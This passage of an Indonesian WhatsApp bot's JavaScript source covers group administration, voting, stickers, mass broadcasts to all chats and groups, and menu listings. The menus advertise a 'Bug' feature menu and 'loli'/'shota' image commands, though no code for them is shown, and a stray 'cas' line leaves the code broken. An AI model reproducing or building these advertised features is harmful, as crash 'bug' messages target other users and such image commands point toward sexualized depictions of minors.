await Cepti.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'setbio':
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`Mana text nya?`)
Cepti.setStatus(q)
reply(`*Bio telah di ganti menjadi ${q}*`)
break
  case 'setppbot': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
await Cepti.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.success)
}
break
   case 'setppgroup': case 'setppgrup': case 'setppgc': {

    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isAdmins) return reply( mess.admin)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
await Cepti.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.success)
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)

    if (isBan) return reply(mess.banned)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
Cepti.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)

    if (isBan) return reply(mess.banned)
Cepti.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
   case 'vote': {

    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (m.chat in vote) return reply( `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`)
if (!text) return reply( `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`)
reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

let buttonMessageVote = {
text: teks_vote,
footer: ` © ${setting.botName} bot`,
buttons: buttonsVote,
headerType: 1
}
Cepti.sendMessage(m.chat, buttonMessageVote)
}
break
   case 'upvote': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply( `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return reply( 'Kamu Sudah Vote')
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

let buttonMessageUpvote = {
text: teks_vote,
footer: ` © ${setting.botName} bot`,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
 }
Cepti.sendMessage(m.chat, buttonMessageUpvote)
}
 break
 case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper1')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `あ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
case 'devote': {
   
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply( `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return reply( 'Kamu Sudah Vote')
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

let buttonMessageDevote = {
text: teks_vote,
footer: ` © ${setting.botName} bot`,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
Cepti.sendMessage(m.chat, buttonMessageDevote)
	}
break
 
case 'cekvote':
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply( `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${Cepti.user.id}
`
Cepti.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply( `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
delete vote[m.chat]
reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					Cepti.sendMessage(m.chat, teks, text,{quoted:m,detectLinks: false})                        
		            })              
					break
   case 'group': case 'grup': {
 
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (args[0] === 'close'){
    await Cepti.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await Cepti.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, `Mode Group`, ` © ${setting.botName} bot`, m)

 }
}
break
case 'editinfo': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
 if (args[0] === 'open'){
await Cepti.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await Cepti.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, `Mode Edit Info`, ` © ${setting.botName} bot`, m)

}
}
break
case 'linkgroup': case 'linkgc': {

    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
let response = await Cepti.groupInviteCode(m.chat)
Cepti.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'ephemeral': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!text) return reply( 'Masukkan value enable/disable')
if (args[0] === 'enable') {
    await Cepti.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
    await Cepti.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
case 'jadibot': {
if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
jadibot(Cepti, m, m.chat)
}
break
case 'listjadibot':
try {
let user = [... new Set([...global.conns.filter(Cepti => Cepti.user).map(Cepti => Cepti.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await Cepti.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Cepti.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break
case 'd': case 'delete': case 'del': {
  
    if (isBan) return reply(mess.banned)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return reply( 'Pesan tersebut bukan dikirim oleh bot!')
Cepti.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'bcgc': case 'bcgroup': {
if (!isOwner) return reply(mess.owner)
if (!text) return reply( `Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await Cepti.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
    await sleep(1500)
    let btn = [{
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/cepti289'
}
}, {
quickReplyButton: {
    displayText: '⋮☰ MENU',
    id: 'menu'
}
}]
 CeptiBotZ = fs.readFileSync('./cepti/menu.png')
 let txt = `「 Broadcast Bot 」\n\n${text}`
 Cepti.send5ButImg(i, txt, ` © ${setting.botName} bot`, CeptiBotZ, btn)
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'setmenu':
if (!isOwner) return reply(mess.owner)
setbot = db.settings[botNumber]
if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
setbot.templateDocument = false
reply(mess.success)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateMsg = false
reply(mess.success)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateMsg = false
setbot.templateDocument = false
reply(mess.success)
} else if (args[0] === 'templateMessage'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = true
setbot.templateDocument = false
reply(mess.success)
} else if (args[0] === 'templateDocument'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
setbot.templateDocument = true
reply(mess.success)
} else {
let sections = [
{
title: "CHANGE BOT MENU",
rows: [
{title: "Image Menu", rowId: `setmenu templateImage`, description: `Klik untuk mengubah menu ke Image Menu`},
{title: "Gif Menu", rowId: `setmenu templateGif`, description: `Klik untuk mengubah menu ke Gif Menu`},
{title: "Video Menu", rowId: `setmenu templateVideo`, description: `Klik untuk mengubah menu ke Video Menu`},
{title: "Text Menu", rowId: `setmenu templateMessage`, description: `Klik untuk mengubah menu ke Text Menu`},
{title: "Document Menu", rowId: `setmenu templateDocument`, description: `Klik untuk mengubah menu ke Document Menu`}
]
},
]
Cepti.sendListMsg(m.chat, `Pilih salah satu mode menu di bawah`, `© ${setting.botName} bot`, '*CHANGE MENU*', `Click Here`, sections, m)
}
break
case 'bc': case 'broadcast': case 'bcall': {
if (!isOwner) return reply(mess.owner)
if (!text) return reply( `Text mana?\n\nExample : ${prefix + command} fatih-san`)
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/cepti289'
}
}, {
quickReplyButton: {
    displayText: '⋮☰ MENU',
    id: 'menu'
}
}]
 CeptiBotZ = fs.readFileSync('./cepti/menu.png')
 let txt = `「 Broadcast Bot 」\n\n${text}`
 Cepti.send5ButImg(yoi, txt, ` © ${setting.botName} bot`, CeptiBotZ, btn)
}
reply('Sukses Broadcast')
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply Pesannya!!')

    if (isBan) return reply(mess.banned)
let wokwol = await Cepti.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
case 'listpc': {
 if (!isOwner) return reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
 }
 Cepti.sendTextWithMentions(m.chat, teks, m)
 }
 break
case 'listgc': {
  if (!isOwner) return reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
let metadata = await Cepti.groupMetadata(i)
teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n─────────────────\n\n`
 }
 Cepti.sendTextWithMentions(m.chat, teks, m)
 }
 break
 case 'listonline': case 'liston': {
   if (!m.isGroup) return reply('Cuma bisa di grub bro')
   
    if (isBan) return reply(mess.banned)
    
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
    let online = [...Object.keys(store.presences[id]), botNumber]
    Cepti.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'swm': case 'stickerwm': {

if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!args.join(" ")) return reply(`Example :\n${prefix}${command} CeptiBotz | botwa`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
reply(mess.wait)
if (m.quoted.isAnimated === true) {
Cepti.downloadAndSaveMediaMessage(quoted, "gifee")
Cepti.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Cepti.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await Cepti.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
confirmlimit(sender, 1)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
 break
   case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
  
    if (isBan) return reply(mess.banned)
if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!quoted) return reply( `Balas Video/Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
    if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Cepti.sendImageAsSticker(m.chat, media, m, { packname: setting.packname, author: setting.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await Cepti.sendVideoAsSticker(m.chat, media, m, { packname: setting.packname, author: setting.author })
await fs.unlinkSync(encmedia)
confirmlimit(sender, 1)
} else {
return reply( `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'ebinary': {
  
    if (isBan) return reply(mess.banned)
if (!m.quoted.text && !text) return reply( `Kirim/reply text dengan caption ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
let eb = await eBinary(teks)
reply(eb)
}
break
case 'dbinary': {
   
    if (isBan) return reply(mess.banned)
if (!m.quoted.text && !text) return reply( `Kirim/reply text dengan caption ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
let db = await dBinary(teks)
reply(db)
}
break
case 'emoji':
  
    if (isBan) return reply(mess.banned)
if (!args.join(" ")) return reply('emojinya?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Cepti.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption:"Done!"}, {quoted:m})
await Cepti.sendMessage(from, {text:"jadikan stiker sendiri jangan manja"}, {quoted:mese})
})
break
case 'command':
  let sections = [
{
	           title: ' ∫ » Sewa Bot? –––––––·•',
	           rows: [
	            {title: "🤑 • Donasi", rowId: `donasi`, description: `KLIK UNTUK SEWA BOT`},
                {title: "😎 • Owner", rowId: `owner`, description: `KLIK UNTUK BERTANYA KEPADA OWNER`}
	            ]
                },{
                title: "⚠︎  ∫ » CHANGE MENU BOT « ✧",
                rows: [
                {title: "✦  「 Group 」", rowId: `groupmenu`, description: `╰ ► 👥Fitur Buat Grup, Tapi Hati Hati Admin :v`},
                {title: "✦  「 Downloader 」", rowId: `downloadmenu`, description: `╰ ► 📥Buat Download Apaan? 🤨`},
                {title: "✦  「 Search 」", rowId: `searchmenu`, description: `╰ ► 🔍Cari Apa Hayo`},
                {title: "✦  「 Random 」", rowId: `mrandom`, description: `╰ ► ❔Random Moment🗿`},
                {title: "✦  「 Text Pro 」", rowId: `makermenu`, description: `╰ ► ❇Teksnya Keren Kan?`},
                    {title: "✦  「 News 」", rowId: `newsmenu`, description: `╰ ► 📃Daftar News Menu?`},
                {title: "✦  「 Stiker」", rowId: `stikermenu`, description: `╰ ► ♻️Gabut Amat`},
                {title: "✦  「 Bug 」", rowId: `bugmenu`, description: `╰ ► 👹 Daftar Bug Menu?`},
                {title: "✦  「 Ephoto 」", rowId: `mephoto`, description: `╰ ► 🗳Buat Edit Apaan?`},
                {title: "✦  「 Fun 」", rowId: `funmenu`, description: `╰ ► 🔫Buat Fun² Bro`},
                {title: "✦  「 Primbon 」", rowId: `primbonmenu`, description: `╰ ► 😂Ngakak`},
                {title: "✦  「 Asupan 」", rowId: `asumenu`, description: `╰ ► 🤤 Asupan nih ka buat para cowo`},
                {title: "✦  「 Convert 」", rowId: `convertmenu`, description: `╰ ► 🛠Mau Buat Apa?`},
                {title: "✦  「 Game 」", rowId: `gamemenu`, description: `╰ ► 🎮Main Gemes Bang?`},
                {title: "✦  「 Main 」", rowId: `mainmenu`, description: `╰ ► 💾Senjata Admin & Owner`},
                {title: "✦  「 Cerpen」", rowId: `cerpenmenu`, description: `╰ ► 📥 Daftar Cerpen Menu`},
                {title: "✦  「 Anime 」", rowId: `animemenu`, description: `╰ ► 🎭Anda Wibu ya !`},
                {title: "✦  「 Islamic 」", rowId: `islammenu`, description: `╰ ► 🕌Masyaallah Brother`},
                {title: "✦  「 Voice 」", rowId: `voicemenu`, description: `╰ ► 🎶Req Lagu Apa Ngab?`},
                {title: "✦  「 Owner 」", rowId: `ownermenu`, description: `╰ ► 🎟Jangan Ganggu Ownerku😡`}
                ]
                },{
	           title: ' ∫ » SUPPORT ME –––––––·•',
	           rows: [
	            {title: "🎟 • Sewabot", rowId: `sewabot`, description: `╰ ► 💰 Sewabot ♕︎`},
                {title: "📚 • Github", rowId: `sc`, description: `╰ ► 🎷 Follow My Github ♕︎`}
	]
  },
]
Cepti.sendListMsg(m.chat, `Hallo ${pushname} ${ucapanWaktu}\nPilih salah satu menu di bawah`,`*© CEPTIBOTZ*`, `*LIST MENU CEPTIBOTZ MD*`, `Click Here`, sections, m)
///////MENU
break
case 'cerpenmenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *ANIME MENU*
│⫹⫺  ${prefix}cerpen
│⫹⫺  ${prefix}cerpen-sejarah
│⫹⫺  ${prefix}cerpen-sedih
│⫹⫺  ${prefix}cerpen-sastra
│⫹⫺  ${prefix}cerpen-romantis
│⫹⫺  ${prefix}cerpen-rohani
│⫹⫺  ${prefix}cerpen-rindu
│⫹⫺  ${prefix}cerpen-remaja
│⫹⫺  ${prefix}cerpen-ramadhan
│⫹⫺  ${prefix}cerpen-petualangan
│⫹⫺  ${prefix}cerpen-persahabatan
│⫹⫺  ${prefix}cerpen-perpisahan
│⫹⫺  ${prefix}cerpen-perjuangan
│⫹⫺  ${prefix}cerpen-penyesalan
│⫹⫺  ${prefix}cerpen-pengorbanan
│⫹⫺  ${prefix}cerpen-pengalaman
│⫹⫺  ${prefix}cerpen-pendidikan
│⫹⫺  ${prefix}cerpen-penantian
│⫹⫺  ${prefix}cerpen-patahhati
│⫹⫺  ${prefix}cerpen-olahraga
│⫹⫺  ${prefix}cerpen-nasionalisme
│⫹⫺  ${prefix}cerpen-nasihat
│⫹⫺  ${prefix}cerpen-motivasi
│⫹⫺  ${prefix}cerpen-misteri
│⫹⫺  ${prefix}cerpen-mengharukan
│⫹⫺  ${prefix}cerpen-malaysia
│⫹⫺  ${prefix}cerpen-liburan
│⫹⫺  ${prefix}cerpen-kristen
│⫹⫺  ${prefix}cerpen-korea
│⫹⫺  ${prefix}cerpen-kisahnyata
│⫹⫺  ${prefix}cerpen-keluarga
│⫹⫺  ${prefix}cerpen-kehidupan
│⫹⫺  ${prefix}cerpen-jepang
│⫹⫺  ${prefix}cerpen-inspiratif
│⫹⫺  ${prefix}cerpen-gokil
│⫹⫺  ${prefix}cerpen-galau
│⫹⫺  ${prefix}cerpen-cintasejati
│⫹⫺  ${prefix}cerpen-cintasegitiga
│⫹⫺  ${prefix}cerpen-cintasedih
│⫹⫺  ${prefix}cerpen-cintaromantis
│⫹⫺  ${prefix}cerpen-cintapertama
│⫹⫺  ${prefix}cerpen-cintaislami
│⫹⫺  ${prefix}cerpen-cinta
│⫹⫺  ${prefix}cerpen-budaya
│⫹⫺  ${prefix}cerpen-bahasasunda
│⫹⫺  ${prefix}cerpen-bahasajawa
│⫹⫺  ${prefix}cerpen-bahasainggris
│⫹⫺  ${prefix}cerpen-bahasadaerah
│⫹⫺  ${prefix}cerpen-anak
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
cas
case 'animemenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *ANIME MENU*
│⫹⫺  ${prefix}cry
│⫹⫺  ${prefix}kill
│⫹⫺  ${prefix}hug
│⫹⫺  ${prefix}pat
│⫹⫺  ${prefix}lick
│⫹⫺  ${prefix}kiss
│⫹⫺  ${prefix}bite
│⫹⫺  ${prefix}yeet
│⫹⫺  ${prefix}neko
│⫹⫺  ${prefix}bully
│⫹⫺  ${prefix}bonk
│⫹⫺  ${prefix}wink
│⫹⫺  ${prefix}poke
│⫹⫺  ${prefix}nom
│⫹⫺  ${prefix}slap
│⫹⫺  ${prefix}smile
│⫹⫺  ${prefix}wave
│⫹⫺  ${prefix}awoo
│⫹⫺  ${prefix}blush
│⫹⫺  ${prefix}smug
│⫹⫺  ${prefix}glomp
│⫹⫺  ${prefix}happy
│⫹⫺  ${prefix}dance
│⫹⫺  ${prefix}cringe
│⫹⫺  ${prefix}cuddle
│⫹⫺  ${prefix}highfive
│⫹⫺  ${prefix}handhold
│⫹⫺  ${prefix}manga
│⫹⫺  ${prefix}pat
│⫹⫺  ${prefix}quotesanime
│⫹⫺  ${prefix}wallnime
│⫹⫺  ${prefix}waifu
│⫹⫺  ${prefix}waifu2
│⫹⫺  ${prefix}husbu
│⫹⫺  ${prefix}neko
│⫹⫺  ${prefix}neko2
│⫹⫺  ${prefix}kemonomimi
│⫹⫺  ${prefix}loli
│⫹⫺  ${prefix}shota
╰────❍
`
    buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: `© ${setting.botName} bot`,
buttons: buttonss2,
headerType: 1
}
Cepti.sendMessage(from, pa3, {quoted:m})
break
case 'makermenu':

    if (isBan) return reply(mess.banned)
 menu = `
╭──❍ *MAKER MENU*
│⫹⫺  ${prefix}nulis
│⫹⫺  ${prefix}3dbox
│⫹⫺  ${prefix}drapwater
│⫹⫺  ${prefix}lion2
│⫹⫺  ${prefix}papercut
│⫹⫺  ${prefix}transformer
│⫹⫺  ${prefix}herryp
│⫹⫺  ${prefix}neondevil
│⫹⫺  ${prefix}3dstone
│⫹⫺  ${prefix}3davengers
│⫹⫺  ${prefix}thunder
│⫹⫺  ${prefix}window
│⫹⫺  ${prefix}graffiti
│⫹⫺  ${prefix}pornhub
│⫹⫺  ${prefix}blackping
│⫹⫺  ${prefix}glitch
│⫹⫺  ${prefix}glitch2
│⫹⫺  ${prefix}glitch3
│⫹⫺  ${prefix}3dspace
│⫹⫺  ${prefix}lion
│⫹⫺  ${prefix}3dneon
│⫹⫺  ${prefix}neon
│⫹⫺  ${prefix}greenneon
│⫹⫺  ${prefix}bokeh
│⫹⫺  ${prefix}hollographic
│⫹⫺  ${prefix}bear
│⫹⫺  ${prefix}wolf
│⫹⫺  ${prefix}joker
│⫹⫺  ${prefix}dropwater
│⫹⫺  ${prefix}neonlight
│⫹⫺  ${prefix}natural
│⫹⫺  ${prefix}carbon
│⫹⫺  ${prefix}pencil
│⫹⫺  ${prefix}candy
│⫹⫺  ${prefix}christmas
│⫹⫺  ${prefix}3dchristmas
│⫹⫺  ${prefix}sparklechristmas
│⫹⫺  ${prefix}deepsea
│⫹⫺  ${prefix}scifi
│⫹⫺  ${prefix}rainbow
│⫹⫺  ${prefix}waterpipe
│⫹⫺  ${prefix}spooky
│⫹⫺  ${prefix}circuit
│⫹⫺  ${prefix}discovery
│⫹⫺  ${prefix}metalic
│⫹⫺  ${prefix}fiction
│⫹⫺  ${prefix}demon
│⫹⫺  ${prefix}berry
│⫹⫺  ${prefix}thunder
│⫹⫺  ${prefix}magma
│⫹⫺  ${prefix}3dstone
│⫹⫺  ${prefix}neonlight
│⫹⫺  ${prefix}glitch
│⫹⫺  ${prefix}harrypotter
│⫹⫺  ${prefix}brokenglass
│⫹⫺  ${prefix}papercut
│⫹⫺  ${prefix}watercolor
│⫹⫺  ${prefix}multicolor
